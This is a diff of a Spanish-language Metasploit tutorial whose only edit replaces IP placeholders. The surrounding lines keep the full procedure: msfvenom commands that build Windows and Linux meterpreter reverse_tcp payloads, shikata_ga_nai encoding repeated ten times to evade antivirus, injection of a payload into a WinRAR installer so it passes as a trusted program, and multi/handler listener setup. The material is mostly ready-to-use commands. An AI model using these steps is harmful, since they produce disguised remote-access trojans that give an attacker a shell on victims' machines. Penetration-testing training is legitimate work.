@@ -13,7 +13,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 ```bash 
 1. Debemos crear el Msfvenom en nuestra maquina Linux 
 
-❯ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > /home/kali/Desktop/payloadx86.exe
+❯ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f exe > /home/kali/Desktop/payloadx86.exe
 
 	# LHOST = IP de atacante 
 	# LHOST = Puerto de atacante 
@@ -21,7 +21,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	# a = Arquitectura x64, x86
 	# f = Formato de salida y la ruta en donde nos lo creara (exe, war, etc...)
 
-❯ msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > /home/kali/Desktop/payloadx64.exe
+❯ msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f exe > /home/kali/Desktop/payloadx64.exe
 ```
 
 ```bash 
@@ -42,7 +42,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	❯ use multi/handler                 
 	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
 	❯ options
-	❯ set LHOST 192.168.68.1                     
+	❯ set LHOST ❮IP❯                     
 	❯ set LPORT 1234
 	❯ run
 ```
@@ -52,7 +52,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 ```bash 
 1. Debemos crear el Msfvenom en nuestra maquina Linux 
 
-❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf > ~/Desktop/payloadx86
+❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f elf > ~/Desktop/payloadx86
 
 	# LHOST = IP de atacante 
 	# LHOST = Puerto de atacante 
@@ -60,7 +60,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	# a = Arquitectura x64, x86
 	# f = Formato de salida y la ruta en donde nos lo creara (elf, exe, war, etc...) y podemos o no agregarle la extension 
 
-❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf > ~/Desktop/payloadx64
+❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f elf > ~/Desktop/payloadx64
 ```
 
 ```bash 
@@ -81,7 +81,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	❯ use multi/handler                 
 	❯ set payload linux/x68/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
 	❯ options
-	❯ set LHOST 192.168.68.1                     
+	❯ set LHOST ❮IP❯                    
 	❯ set LPORT 1234
 	❯ run
 ```
@@ -99,11 +99,11 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 ### Para Windows 
 
 ```bash 
-❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe
 	# e = Nombre del encoder 
 
 
-❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe
 
 	# e = Nombre del encoder 
 	# i = Iteraciones 
@@ -127,7 +127,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	❯ use multi/handler                 
 	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
 	❯ options
-	❯ set LHOST 192.168.68.1                     
+	❯ set LHOST ❮IP❯                     
 	❯ set LPORT 1234
 	❯ run
 ```
@@ -135,7 +135,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 ### Para Linux 
 
 ```bash 
-❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/Desktop/encodex86
+❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/Desktop/encodex86
 
 	# e = Nombre del encoder 
 	# i = Iteraciones 
@@ -159,7 +159,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	❯ use multi/handler                 
 	❯ set payload linux/x68/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
 	❯ options
-	❯ set LHOST 192.168.68.1                     
+	❯ set LHOST ❮IP❯                     
 	❯ set LPORT 1234
 	❯ run
 ```
@@ -173,10 +173,10 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 
 ```bash 
 # Creamos el payload y se lo pasamos a un archivo ejecutable 'confiable'
-❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
 	# x = Especificar el archivo ejecutable para usar como plantilla (No inicia el proceso del archivo ejecutable)
 
-❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
 	# k = Preserva la plantilla con el comportamiento original del ejecutable y ademas inyecta el payload (Inicia normal el proceso del archivo ejecutable)
 ```
 
@@ -198,7 +198,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	❯ use multi/handler                 
 	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
 	❯ options
-	❯ set LHOST 192.168.68.1                     
+	❯ set LHOST ❮IP❯                    
 	❯ set LPORT 1234
 	❯ run
 ```
